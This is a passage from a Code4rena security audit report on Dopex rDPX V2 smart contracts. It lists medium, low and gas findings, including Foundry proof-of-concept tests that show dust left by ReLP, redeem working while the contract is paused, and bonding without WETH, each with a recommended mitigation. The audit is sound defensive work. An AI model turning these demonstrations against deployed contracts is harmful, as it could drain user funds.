        string internal constant ARBITRUM_RPC_URL =
            "https://arbitrum-mainnet.infura.io/v3/c088bb4e4cc643d5a0d3bb668a400685";
        uint256 internal constant BLOCK_NUM = 24023149; // 2022/09/13

        MockToken weth;
        MockToken rdpx;
        MockRdpxV2Core core;
        RdpxReserve reserve;
        MockUniV2Amo amo;
        MockRdpxEthPriceOracle oracle;

        IUniswapV2Factory factory;
        IUniswapV2Router router;
        IUniswapV2Pair pair;
        ReLPContract re;

        function setUp() public {
            uint256 forkId = vm.createFork(ARBITRUM_RPC_URL, BLOCK_NUM);
            vm.selectFork(forkId);

            weth = new MockToken("WETH", "weth");
            rdpx = new MockToken("RDPX", "rdpx");
            core = new MockRdpxV2Core();
            reserve = new RdpxReserve(address(rdpx));
            amo = new MockUniV2Amo();
            oracle = new MockRdpxEthPriceOracle();

            factory =
                IUniswapV2Factory(0xc35DADB65012eC5796536bD9864eD8773aBc74C4);
            router =
                IUniswapV2Router(0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506);

            pair = IUniswapV2Pair(
                factory.createPair(address(rdpx), address(weth))
            );

            re = new ReLPContract();
            re.setAddresses(
                address(rdpx),
                address(weth),
                address(pair),
                address(core),
                address(reserve),
                address(amo),
                address(oracle),
                address(factory),
                address(router)
            );

            re.setreLpFactor(1e8);
        }

        function test_poc_relp_dust() public {
            weth.mint(address(this), 1000e18);
            rdpx.mint(address(this), 1000e18);
            rdpx.mint(address(reserve), 10e18);

            weth.approve(address(router), type(uint256).max);
            rdpx.approve(address(router), type(uint256).max);

            // Initial liquidity in the pair (give to amo)
            router.addLiquidity(
                address(rdpx),
                address(weth),
                100e18,
                30e18,
                100e18,
                30e18,
                address(amo),
                block.timestamp
            );

            // pool is at 1 rdpx = 0.3 eth
            oracle.updateRdpxPrice(0.3e8);

            amo.approve(address(pair), address(re), type(uint256).max);

            logInfo("Before relp");
            (uint112 tokenAReserve,,) = pair.getReserves();
            re.reLP(Math.sqrt(uint256(tokenAReserve)) * 250000);
            logInfo("After relp");

        }

        function logInfo(string memory label) private view {
            console.log(label);
            uint256 lpBalanceAmo = pair.balanceOf(address(amo));
            uint256 lpBalanceRelp = pair.balanceOf(address(re));
            uint256 rdpxBalanceCore = rdpx.balanceOf(address(core));
            uint256 wethBalanceRelp = weth.balanceOf(address(re));
            console.log("  lp:   amo=%s, relp=%s", lpBalanceAmo, lpBalanceRelp);
            console.log("  rdpx: core=%s", rdpxBalanceCore);
            console.log("  weth: relp=%s", wethBalanceRelp);
            console.log();
        }
    }
```

</details>

```

    // Output
    Running 1 test for tests/ReLpDustPoc.t.sol:ReLpDustPoc
    [PASS] test_poc_relp_dust() (gas: 738137)
    Logs:
      Before relp
        lp:   amo=54772255750516610345, relp=0
        rdpx: core=0
        weth: relp=0
      
      After relp
        lp:   amo=54685393436705721902, relp=0
        rdpx: core=316227765999999999
        weth: relp=67290285273869
```

### Tools Used

[Optimal One-sided Supply to Uniswap 🦄](https://blog.alphaventuredao.io/onesideduniswap/)

### Recommended Mitigation Steps

There is an [analytic formula](https://blog.alphaventuredao.io/onesideduniswap/) to provide one-sided liquidity to Uniswap V2 without leaving dust. This formula can be adapted to `ReLP`'s use-case such that `reLPFactor` specifies what part of the WETH make-up of the position will be swapped to RDPX according to the formula.

Still, up to 2 wei of dust may be left after the operation, so the remainding RDPX *and* WETH should be sent to the core contract.

**[Alex the Entreprenerd (Judge) decreased severity to Medium](https://github.com/code-423n4/2023-08-dopex-findings/issues/153#issuecomment-1755948374)**

***

## [[M-17] The RdpxV2Core contract allows anyone to call redeem tokens even if the contract is paused](https://github.com/code-423n4/2023-08-dopex-findings/issues/6)
*Submitted by [LowK](https://github.com/code-423n4/2023-08-dopex-findings/issues/6), also found by [HHK](https://github.com/code-423n4/2023-08-dopex-findings/issues/2229), [Tendency](https://github.com/code-423n4/2023-08-dopex-findings/issues/1900), [ItsNio](https://github.com/code-423n4/2023-08-dopex-findings/issues/1683), [ak1](https://github.com/code-423n4/2023-08-dopex-findings/issues/1635), and [Inspecktor](https://github.com/code-423n4/2023-08-dopex-findings/issues/1235)*

When the admin pauses the contract RdpxV3core locks anyone to use this contract such as a bond, bondWithDelegate, and withdraw. But a function redeem is still available to use.
Any situations that occur like a hack accident or system are under maintenance then anyway, your smart contract is running to continue to get unexpected.

### Proof of Concept

The code below does not call a function `whenNotPause()` to check whether this contract is paused or not.

    function redeem(
        uint256 id,
        address to
      ) external returns (uint256 receiptTokenAmount) {
        // Validate bond ID
        _validate(bonds[id].timestamp > 0, 6);
        // Validate if bond has matured
        _validate(block.timestamp > bonds[id].maturity, 7);

        _validate(
          msg.sender == RdpxV2Bond(addresses.receiptTokenBonds).ownerOf(id),
          9
        );

        // Burn the bond token
        // Note requires an approval of the bond token to this contract
        RdpxV2Bond(addresses.receiptTokenBonds).burn(id);

        // transfer receipt tokens to user
        receiptTokenAmount = bonds[id].amount;
        IERC20WithBurn(addresses.rdpxV2ReceiptToken).safeTransfer(
          to,
          receiptTokenAmount
        );

        emit LogRedeem(to, receiptTokenAmount);
      }

To reproduce this vulnerability, let's modify a test called `testRedeem()` in a `/test/rdpxV2-core/Unit.t.sol`. After running the test, you will get everything passed. So it is proof of vulnerable

    function testRedeem() public {
        rdpxV2Core.bond(1 * 1e18, 0, address(this));
        // ...
        rdpxV2Core.pause(); // <- add this line to test

        // test redeem after expiry
        rdpxV2Bond.approve(address(rdpxV2Core), 0);
        rdpxV2Core.redeem(0, address(1));
        assertEq(rdpxV2Bond.balanceOf(address(this)), 0);
        assertEq(rdpxV2ReceiptToken.balanceOf(address(1)), 25 * 1e16);
        // ...
    }

### Recommended Mitigation Steps

Adding the line `_whenNotPaused();` into the function `redeem()`.

**[psytama (Dopex) confirmed](https://github.com/code-423n4/2023-08-dopex-findings/issues/6#issuecomment-1734116507)**

*** 

## [M-18] Return values of `approve()` not checked

*Submitted by [IllIllI](https://gist.github.com/code423n4/3c6507b76ca940e11c287862cb4a1fd3?permalink_comment_id=4779121#m01-return-values-of-approve-not-checked)*

_Note: this finding was reported via the winning [Automated Findings report](https://gist.github.com/code423n4/3c6507b76ca940e11c287862cb4a1fd3). It was declared out of scope for the audit, but is being included here for completeness._

Not all `IERC20` implementations `revert()` when there's a failure in `approve()`. The function signature has a `boolean` return value and they indicate errors that way instead. By not checking the return value, operations that should have marked as failed, may potentially go through without actually approving anything.

*There are 5 instances of this issue:*

```solidity
File: contracts/amo/UniV2LiquidityAmo.sol

134:     IERC20WithBurn(_token).approve(_spender, _amount);

```
*GitHub*: [134](https://github.com/code-423n4/2023-08-dopex/blob/0ea4387a4851cd6c8811dfb61da95a677f3f63ae/contracts/amo/UniV2LiquidityAmo.sol#L134-L134)

```solidity
File: contracts/amo/UniV3LiquidityAmo.sol

150:       IERC20WithBurn(_token).approve(_target, _amount);

169      IERC20WithBurn(params._tokenA).approve(
170        address(univ3_positions),
171        params._amount0Desired
172:     );

173      IERC20WithBurn(params._tokenB).approve(
174        address(univ3_positions),
175        params._amount1Desired
176:     );

```
*GitHub*: [150](https://github.com/code-423n4/2023-08-dopex/blob/0ea4387a4851cd6c8811dfb61da95a677f3f63ae/contracts/amo/UniV3LiquidityAmo.sol#L150-L150), [169](https://github.com/code-423n4/2023-08-dopex/blob/0ea4387a4851cd6c8811dfb61da95a677f3f63ae/contracts/amo/UniV3LiquidityAmo.sol#L169-L172), [173](https://github.com/code-423n4/2023-08-dopex/blob/0ea4387a4851cd6c8811dfb61da95a677f3f63ae/contracts/amo/UniV3LiquidityAmo.sol#L173-L176)

```solidity
File: contracts/core/RdpxV2Core.sol

411:     IERC20WithBurn(_token).approve(_spender, _amount);

```
*GitHub*: [411](https://github.com/code-423n4/2023-08-dopex/blob/0ea4387a4851cd6c8811dfb61da95a677f3f63ae/contracts/core/RdpxV2Core.sol#L411-L411)

**[psytama (Dopex) disputed](https://gist.github.com/code423n4/3c6507b76ca940e11c287862cb4a1fd3?permalink_comment_id=4779111#gistcomment-4779111)**

**[Alex the Entreprenerd (Judge) commented](https://gist.github.com/code423n4/3c6507b76ca940e11c287862cb4a1fd3?permalink_comment_id=4779121#gistcomment-4779121)**
 >This can be argued to be medium although in most circumnstances the tx would revert later.

***

## [M-19] Using `block.timestamp` as the deadline/expiry invites MEV

*Submitted by [IllIllI](https://gist.github.com/code423n4/3c6507b76ca940e11c287862cb4a1fd3?permalink_comment_id=4779121#m02-using-blocktimestamp-as-the-deadlineexpiry-invites-mev)*

_Note: this finding was reported via the winning [Automated Findings report](https://gist.github.com/code423n4/3c6507b76ca940e11c287862cb4a1fd3). It was declared out of scope for the audit, but is being included here for completeness._

Passing `block.timestamp` as the expiry/deadline of an operation does not mean "require immediate execution" - it means "whatever block this transaction appears in, I'm comfortable with that block's timestamp". Providing this value means that a malicious miner can hold the transaction for as long as they like (think the flashbots mempool for bundling transactions), which may be until they are able to cause the transaction to incur the maximum amount of slippage allowed by the slippage parameter, or until conditions become unfavorable enough that other orders, e.g. liquidations, are triggered. Timestamps should be chosen off-chain, and should be specified by the caller to avoid unnecessary MEV.

*There is one instance of this issue:*

```solidity
File: contracts/amo/UniV2LiquidityAmo.sol

337        .swapExactTokensForTokens(
338          token1Amount,
339          token2AmountOutMin,
340          path,
341          address(this),
342          block.timestamp + 1
343        )[path.length - 1];
344  
345:     // send tokens back to rdpxV2Core

```
*GitHub*: [337](https://github.com/code-423n4/2023-08-dopex/blob/0ea4387a4851cd6c8811dfb61da95a677f3f63ae/contracts/amo/UniV2LiquidityAmo.sol#L337-L345)

**[psytama (Dopex) confirmed](https://gist.github.com/code423n4/3c6507b76ca940e11c287862cb4a1fd3?permalink_comment_id=4779111#gistcomment-4779111)**

**[Alex the Entreprenerd (Judge) commented](https://gist.github.com/code423n4/3c6507b76ca940e11c287862cb4a1fd3?permalink_comment_id=4779121#gistcomment-4779121)**
 >This I agree with the sponsor that could be considered Medium as it allows MEV to be extracted by delaying tx inclusion.

***

## [M-20] Unsafe use of `transfer()`/`transferFrom()` with `IERC20`

*Submitted by [IllIllI](https://gist.github.com/code423n4/3c6507b76ca940e11c287862cb4a1fd3?permalink_comment_id=4779121#m04-unsafe-use-of-transfertransferfrom-with-ierc20)*

_Note: this finding was reported via the winning [Automated Findings report](https://gist.github.com/code423n4/3c6507b76ca940e11c287862cb4a1fd3). It was declared out of scope for the audit, but is being included here for completeness._

Some tokens do not implement the ERC20 standard properly but are still accepted by most code that accepts ERC20 tokens.  For example Tether (USDT)'s `transfer()` and `transferFrom()` functions on L1 do not return booleans as the specification requires, and instead have no return value. When these sorts of tokens are cast to `IERC20`, their [function signatures](https://medium.com/coinmonks/missing-return-value-bug-at-least-130-tokens-affected-d67bf08521ca) do not match and therefore the calls made, revert (see [this](https://gist.github.com/IllIllI000/2b00a32e8f0559e8f386ea4f1800abc5) link for a test case). Use OpenZeppelinundefineds `SafeERC20`'s `safeTransfer()`/`safeTransferFrom()` instead

*There are 6 instances of this issue:*

```solidity
File: contracts/amo/UniV3LiquidityAmo.sol

158      IERC20WithBurn(params._tokenA).transferFrom(
159        rdpxV2Core,
160        address(this),
161        params._amount0Desired
162:     );

163      IERC20WithBurn(params._tokenB).transferFrom(
164        rdpxV2Core,
165        address(this),
166        params._amount1Desired
167:     );

283      IERC20WithBurn(_tokenA).transferFrom(
284        rdpxV2Core,
285        address(this),
286        _amountAtoB
287:     );

```
*GitHub*: [158](https://github.com/code-423n4/2023-08-dopex/blob/0ea4387a4851cd6c8811dfb61da95a677f3f63ae/contracts/amo/UniV3LiquidityAmo.sol#L158-L162), [163](https://github.com/code-423n4/2023-08-dopex/blob/0ea4387a4851cd6c8811dfb61da95a677f3f63ae/contracts/amo/UniV3LiquidityAmo.sol#L163-L167), [283](https://github.com/code-423n4/2023-08-dopex/blob/0ea4387a4851cd6c8811dfb61da95a677f3f63ae/contracts/amo/UniV3LiquidityAmo.sol#L283-L287)

```solidity
File: contracts/perp-vault/PerpetualAtlanticVaultLP.sol

128:     collateral.transferFrom(msg.sender, address(this), assets);

170:     collateral.transfer(receiver, assets);

```
*GitHub*: [128](https://github.com/code-423n4/2023-08-dopex/blob/0ea4387a4851cd6c8811dfb61da95a677f3f63ae/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L128-L128), [170](https://github.com/code-423n4/2023-08-dopex/blob/0ea4387a4851cd6c8811dfb61da95a677f3f63ae/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L170-L170)

```solidity
File: contracts/reLP/ReLPContract.sol

243      IERC20WithBurn(addresses.pair).transferFrom(
244        addresses.amo,
245        address(this),
246        lpToRemove
247:     );

```
*GitHub*: [243](https://github.com/code-423n4/2023-08-dopex/blob/0ea4387a4851cd6c8811dfb61da95a677f3f63ae/contracts/reLP/ReLPContract.sol#L243-L247)

**[psytama (Dopex) disputed](https://gist.github.com/code423n4/3c6507b76ca940e11c287862cb4a1fd3?permalink_comment_id=4779111#gistcomment-4779111)**

**[Alex the Entreprenerd (Judge) commented](https://gist.github.com/code423n4/3c6507b76ca940e11c287862cb4a1fd3?permalink_comment_id=4779121#gistcomment-4779121)**
 >I believe this should be Classified as Medium as a no-op here can break accounting, even though on Arbitrum this is lower likelihood.
***

# Low Risk and Non-Critical Issues

For this audit, 52 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2023-08-dopex-findings/issues/1033) by **juancito** received the top score from the judge.

*The following wardens also submitted reports: [Toshii](https://github.com/code-423n4/2023-08-dopex-findings/issues/2099), [ladboy233](https://github.com/code-423n4/2023-08-dopex-findings/issues/2049), [Evo](https://github.com/code-423n4/2023-08-dopex-findings/issues/1830), [peakbolt](https://github.com/code-423n4/2023-08-dopex-findings/issues/1589), [glcanvas](https://github.com/code-423n4/2023-08-dopex-findings/issues/1493), [sces60107](https://github.com/code-423n4/2023-08-dopex-findings/issues/1454), [ubermensch](https://github.com/code-423n4/2023-08-dopex-findings/issues/1304), [carrotsmuggler](https://github.com/code-423n4/2023-08-dopex-findings/issues/1056), [said](https://github.com/code-423n4/2023-08-dopex-findings/issues/882), [lsaudit](https://github.com/code-423n4/2023-08-dopex-findings/issues/809), [T1MOH](https://github.com/code-423n4/2023-08-dopex-findings/issues/425), [deadrxsezzz](https://github.com/code-423n4/2023-08-dopex-findings/issues/147), [KrisApostolov](https://github.com/code-423n4/2023-08-dopex-findings/issues/2217), [0xkazim](https://github.com/code-423n4/2023-08-dopex-findings/issues/2211), [josephdara](https://github.com/code-423n4/2023-08-dopex-findings/issues/2157), [dethera](https://github.com/code-423n4/2023-08-dopex-findings/issues/2145), [QiuhaoLi](https://github.com/code-423n4/2023-08-dopex-findings/issues/2132), [savi0ur](https://github.com/code-423n4/2023-08-dopex-findings/issues/2119), [Yanchuan](https://github.com/code-423n4/2023-08-dopex-findings/issues/2118), [MohammedRizwan](https://github.com/code-423n4/2023-08-dopex-findings/issues/2061), [codegpt](https://github.com/code-423n4/2023-08-dopex-findings/issues/2034), [Nikki](https://github.com/code-423n4/2023-08-dopex-findings/issues/1952), [0xTiwa](https://github.com/code-423n4/2023-08-dopex-findings/issues/1874), [parsely](https://github.com/code-423n4/2023-08-dopex-findings/issues/1842), [catellatech](https://github.com/code-423n4/2023-08-dopex-findings/issues/1839), [\_\_141345\_\_](https://github.com/code-423n4/2023-08-dopex-findings/issues/1836), [minhquanym](https://github.com/code-423n4/2023-08-dopex-findings/issues/1668), [ether\_sky](https://github.com/code-423n4/2023-08-dopex-findings/issues/1659), [WoolCentaur](https://github.com/code-423n4/2023-08-dopex-findings/issues/1622), [Aymen0909](https://github.com/code-423n4/2023-08-dopex-findings/issues/1553), [pep7siup](https://github.com/code-423n4/2023-08-dopex-findings/issues/1430), [asui](https://github.com/code-423n4/2023-08-dopex-findings/issues/1269), [klau5](https://github.com/code-423n4/2023-08-dopex-findings/issues/1246), [jasonxiale](https://github.com/code-423n4/2023-08-dopex-findings/issues/1124), [Bauchibred](https://github.com/code-423n4/2023-08-dopex-findings/issues/989), [bart1e](https://github.com/code-423n4/2023-08-dopex-findings/issues/975), [kodyvim](https://github.com/code-423n4/2023-08-dopex-findings/issues/884), [IceBear](https://github.com/code-423n4/2023-08-dopex-findings/issues/871), [0xDING99YA](https://github.com/code-423n4/2023-08-dopex-findings/issues/840), [ABA](https://github.com/code-423n4/2023-08-dopex-findings/issues/799), [0xnev](https://github.com/code-423n4/2023-08-dopex-findings/issues/788), [tapir](https://github.com/code-423n4/2023-08-dopex-findings/issues/655), [gjaldon](https://github.com/code-423n4/2023-08-dopex-findings/issues/621), [erebus](https://github.com/code-423n4/2023-08-dopex-findings/issues/593), [dirk\_y](https://github.com/code-423n4/2023-08-dopex-findings/issues/583), [volodya](https://github.com/code-423n4/2023-08-dopex-findings/issues/574), [zzebra83](https://github.com/code-423n4/2023-08-dopex-findings/issues/349), [rvierdiiev](https://github.com/code-423n4/2023-08-dopex-findings/issues/263), [ArmedGoose](https://github.com/code-423n4/2023-08-dopex-findings/issues/149), [degensec](https://github.com/code-423n4/2023-08-dopex-findings/issues/137), and [chaduke](https://github.com/code-423n4/2023-08-dopex-findings/issues/58).*

## [L-01] - Users can bond without providing WETH

`RdpxV2Core::calculateBondCost()` does not account for precission loss and allows users to bond an amount of `1`, without providing any WETH.

- [RdpxV2Core.sol#L904](https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L904)
- [RdpxV2Core.sol#L705](https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L705)

### Impact

Users can bond without 1 wei providing any WETH. This may break any assumptions regarding accountability of the Core contract, or may be combined with other issues to achieve a more critical one. This step may also be used in a `for` loop to increase the amount without providing WETH.

### Proof of Concept

Add this test to `tests/rdpxV2-core/Unit.t.sol` and run `forge test --mt "testBondNoEthCost"`:

```solidity
  function testBondNoEthCost() public {
    uint256 initialWethBalance = weth.balanceOf(address(this));

    rdpxV2Core.bond(1, 0, address(this));

    uint256 finalWethBalance = weth.balanceOf(address(this));
    assertEq(initialWethBalance, finalWethBalance);
  }
```

### Recommended Mitigation Steps

Validate that the returned `wethRequired` of the `calculateBondCost()` is greater than 0.

## [L-02] - `decreaseAmount` function name is misleading

`RdpxDecayingBonds::decreaseAmount()` does not decrease the bonds amount, but replaces its value. This is misleading and can lead to integration errors if they follow the Natspec: `amount: amount to decrease`.

```solidity
  /// @param amount amount to decrease // @audit
  function decreaseAmount(
    uint256 bondId,
    uint256 amount
  ) public onlyRole(RDPXV2CORE_ROLE) {
    _whenNotPaused();
    bonds[bondId].rdpxAmount = amount; // @audit
  }
```

[RdpxDecayingBonds.sol#L144](https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/decaying-bonds/RdpxDecayingBonds.sol#L144)

The only call to the function in the current scope is performed on the `RdpxV2Core` contract.

In this case the `amount` passed to the `decreaseAmount()` function is the expected decreased value, so the whole system works as expected.

```solidity
    IRdpxDecayingBonds(addresses.rdpxDecayingBonds).decreaseAmount(
        _bondId,
        amount - _rdpxAmount
    );
```

[RdpxV2Core.sol#L645](https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L645)

Nevertheless, this can lead to future errors.

### Recommended Mitigation Steps

Change the name of the function to a better name like `updateAmount()`, or refactor the function and its calls to match its description.

## [L-03] - `addAssetTotokenReserves()` doesn't check that there is no token with the same symbol

The function checks that the token address is not used, but doesn't check for the symbol.

Different tokens may have the same symbol, which can be troublesome, as certain operations rely on the symbol.

- [RdpxV2Core.sol#L240-L264](https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L240-L264)

### Recommended Mitigation Steps

 Verify that the token symbol is not previously used

## [L-04] - The `removeAssetFromtokenReserves()` removes tokens by symbol instead of per address

The `removeAssetFromtokenReserves()` function removes the first token it finds with a specified symbol, which may lead to an error, as multiple tokens can be added with the same symbol.

- [RdpxV2Core.sol#L270-L290](https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L270-L290)

### Recommended Mitigation Steps

Remove tokens by their address instead of by their symbol.

## [L-05] - Approvals can't be completely revoked

The `approveContractToSpend()` function requires that the approved amount is > 0. This means that the function is not capable of revoke token approvals by setting them to 0.

This is also troublesome, as it is the expected behavior if a token approval wants to be removed. It can still be mitigated by sending a value of 1.

- [UniV2LiquidityAmo.sol#L133](https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/amo/UniV2LiquidityAmo.sol#L133)
- [RdpxV2Core.sol#L410](https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L410)

### Recommended Mitigation Steps

Remove the unnecessary requirement of `amount > 0`.

## [L-06] - Unnecessary role check

Role is checked both on the modifier and the function body. Consider removing one:

```solidity
  function mint(
    address to,
    uint256 expiry,
    uint256 rdpxAmount
  ) external onlyRole(MINTER_ROLE) { // @audit
    _whenNotPaused();
    require(hasRole(MINTER_ROLE, msg.sender), "Caller is not a minter"); // @audit
```

[RdpxDecayingBonds.sol#L114-L120](https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/decaying-bonds/RdpxDecayingBonds.sol#L114-L120)

## [L-07] - `RDPXV2CORE_ROLE` is not assigned in `PerpetualAtlanticVault`

While the `DEFAULT_ADMIN_ROLE`, and `MANAGER_ROLE` are assigned during the `constructor()`, the `RDPXV2CORE_ROLE` is not.

Any call from the Core contract to the vault will revert until this value is set, so it would be advised to assign this role in the constructor as well.

[PerpetualAtlanticVault.sol#L113-L128](https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVault.sol#L113-L128)

## [Refactor-01] - Unnecessary struct attribute prefix

`TokenAInfo` attributes are all prefixed with `tokenA`. This is unnecessary, as they are known to be from a `TokenAInfo` struct. Consider removing the prefix:

```solidity
  struct TokenAInfo {
    // tokenA reserves
    uint256 tokenAReserve;
    // rdpx price
    uint256 tokenAPrice;
    // tokenA LP reserves
    uint256 tokenALpReserve;
  }
```

[ReLPContract.sol#L51-L58](https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/reLP/ReLPContract.sol#L51-L58)

## [Refactor-02] - Repeated expression

Long expression that are repeated can lead to errors if refactored, and are harder to read.

Consider creating a variable to store the expression `(currentFundingRate * (nextFundingPaymentTimestamp() - startTime)) / 1e18`, which is repeated 3 times:

```solidity
  collateralToken.safeTransfer(
    addresses.perpetualAtlanticVaultLP,
    (currentFundingRate * (nextFundingPaymentTimestamp() - startTime)) / // @audit
      1e18
  );

  IPerpetualAtlanticVaultLP(addresses.perpetualAtlanticVaultLP)
    .addProceeds(
      (currentFundingRate * (nextFundingPaymentTimestamp() - startTime)) / // @audit
        1e18
    );

  emit FundingPaid(
    msg.sender,
    ((currentFundingRate * (nextFundingPaymentTimestamp() - startTime)) / // @audit
      1e18),
    latestFundingPaymentPointer
  );
```

**[Alex the Entreprenerd (Judge) commented](https://github.com/code-423n4/2023-08-dopex-findings/issues/1033#issuecomment-1755175409):**
>Severities of each issue:<br>
 Users can bond without providing WETH<br>
 L<br>
 decreaseAmount function name is misleading<br>
 L<br>
 addAssetTotokenReserves() doesn't check that there is no token with the same symbol<br>
 L<br>
 The removeAssetFromtokenReserves() removes tokens by symbol instead of per address<br>
 L<br>
 Approvals can't be completely revoked<br>
 L<br>
 Unnecessary role check<br>
 L<br>
 RDPXV2CORE_ROLE is not assigned in PerpetualAtlanticVault<br>
 L<br>
 Unnecessary struct attribute prefix<br>
 Refactor<br>
 Repeated expression<br>
 Refactor<br>

***

# Gas Optimizations

For this audit, 10 reports were submitted by wardens detailing gas optimizations. The [report highlighted below](https://github.com/code-423n4/2023-08-dopex-findings/issues/1942) by **c3phas** received the top score from the judge.

*The following wardens also submitted reports: [\_\_141345\_\_](https://github.com/code-423n4/2023-08-dopex-findings/issues/1835), [HHK](https://github.com/code-423n4/2023-08-dopex-findings/issues/2173), [QiuhaoLi](https://github.com/code-423n4/2023-08-dopex-findings/issues/2134), [pontifex](https://github.com/code-423n4/2023-08-dopex-findings/issues/2123), [oakcobalt](https://github.com/code-423n4/2023-08-dopex-findings/issues/2055), [0xgrbr](https://github.com/code-423n4/2023-08-dopex-findings/issues/1780), [flacko](https://github.com/code-423n4/2023-08-dopex-findings/issues/1099), [Sathish9098](https://github.com/code-423n4/2023-08-dopex-findings/issues/336), and [LeoS](https://github.com/code-423n4/2023-08-dopex-findings/issues/50).*

## Auditor's Disclaimer 

While we try our best to maintain readability in the provided code snippets, some functions have been truncated to highlight the affected portions.

It's important to note that during the implementation of these suggested changes, developers must exercise caution to avoid introducing vulnerabilities. Although the optimizations have been tested prior to these recommendations, it is the responsibility of the developers to conduct thorough testing again.

Code reviews and additional testing are strongly advised to minimize any potential risks associated with the refactoring process.

## Note on Gas estimates

We've tried to give the exact amount of gas being saved from running the included tests whenever the function is within the test coverage.

Some functions are not covered by the test cases or are internal/private functions. In this case, the gas benchmarks are based on functions that call this internal/private functions.
Some like packing/immutables we can easily tell the amount being saved based on the number of slots being saved.

**The bot did an amazing job on this audit, but still missed some findings.**

## [G-01] Using immutable on variables that are only set in the constructor and never after (Save 8400 Gas)

**This instance was missed by the bot.**

**Gas per instance: 2.1K**<br>
**Total Instances: 4**<br>
Total Gas Saved: `2.1 * 4 = 8400 Gas`

https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/amo/UniV3LiquidityAmo.sol#L68-L72

```solidity
File: /contracts/amo/UniV3LiquidityAmo.sol
68:  // Rdpx address
69:  address public rdpx;

71:  // RdpxV2Core address
72:  address public rdpxV2Core;
```

```diff
   // Rdpx address
-  address public rdpx;
+  address public immutable rdpx;

   // RdpxV2Core address
-  address public rdpxV2Core;
+  address public immutable rdpxV2Core;

```

https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L46
```solidity
File: /contracts/perp-vault/PerpetualAtlanticVaultLP.sol
46:  IPerpetualAtlanticVault public perpetualAtlanticVault;
```

https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L66-L70
```solidity
File: /contracts/perp-vault/PerpetualAtlanticVaultLP.sol
66:  /// @dev address of rdpx token
67:  address public rdpx;
```

```diff
   /// @dev address of rdpx token
-  address public rdpx;
+  address public immutable rdpx;
```

## [G-02] Use a constant variable for `roundingPrecision` (Save 1 SLOT: 2.1k Gas)

https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L104
```solidity
File: /contracts/perp-vault/PerpetualAtlanticVault.sol
104:  uint256 public roundingPrecision = 1e6;
```
The variable `roundingPrecision` is being referenced in two places, see below
https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L576-L583
```solidity
File: /contracts/perp-vault/PerpetualAtlanticVault.sol
576:  function roundUp(uint256 _strike) public view returns (uint256 strike) {
577:    uint256 remainder = _strike % roundingPrecision;
578:    if (remainder == 0) {
579:      return _strike;
580:    } else {
581:      return _strike - remainder + roundingPrecision;
582:    }
583:  }
```

Note, at no instance is our variable being modified, we can therefore save the SLOT it's currently occupying by switching to a constant variable

```diff
diff --git a/contracts/perp-vault/PerpetualAtlanticVault.sol b/contracts/perp-vault/PerpetualAtlanticVault.sol
index 88ac2b3..fefe065 100644
--- a/contracts/perp-vault/PerpetualAtlanticVault.sol
+++ b/contracts/perp-vault/PerpetualAtlanticVault.sol
@@ -101,7 +101,7 @@ contract PerpetualAtlanticVault is
   uint256 public fundingDuration = 7 days;

   /// @dev the precision to round up to
-  uint256 public roundingPrecision = 1e6;
+  uint256 public  constant roundingPrecision = 1e6;
```

## [G-03] Tightly pack storage variables/optimize the order of variable declaration

The EVM works with 32 byte words. Variables less than 32 bytes can be declared next to eachother in storage and this will pack the values together into a single 32 byte storage slot (if the values combined are <= 32 bytes). If the variables packed together are retrieved together in functions we will effectively save ~2000 gas with every subsequent SLOAD for that storage slot. This is due to us incurring a `Gwarmaccess (100 gas)` versus a `Gcoldsload (2100 gas)`.
Here, the storage variables can be tightly packed

https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L57-L98

### We can save one more slot compared to the bot(use `uint40` for `genesis` variable and `lastUpdateTime` and pack them with `collateralToken` ) - Save 2k gas

**Note: The bot didn't pack the genesis variable: we therefore only count the one slot not found by the bot**
```solidity
File: /contracts/perp-vault/PerpetualAtlanticVault.sol
  IERC20WithBurn public collateralToken;

  /// @dev genesis timestamp
  uint256 public genesis;

  /// @dev the timestamp of the last update where funding was paid for
  uint256 public lastUpdateTime;
```

```diff
   /// @dev Collateral Token
   IERC20WithBurn public collateralToken;
+    /// @dev genesis timestamp
+  uint40 public genesis;
+
+  /// @dev the timestamp of the last update where funding was paid for
+  uint40 public lastUpdateTime;

   /// @dev The precision of the collateral token
   uint256 public collateralPrecision;
@@ -91,12 +96,6 @@ contract PerpetualAtlanticVault is
   /// @dev the total number of active options
   uint256 public totalActiveOptions;

-  /// @dev genesis timestamp
-  uint256 public genesis;
-
-  /// @dev the timestamp of the last update where funding was paid for
-  uint256 public lastUpdateTime;
```

### Reordering the order of inheritance can help us pack one more variable 
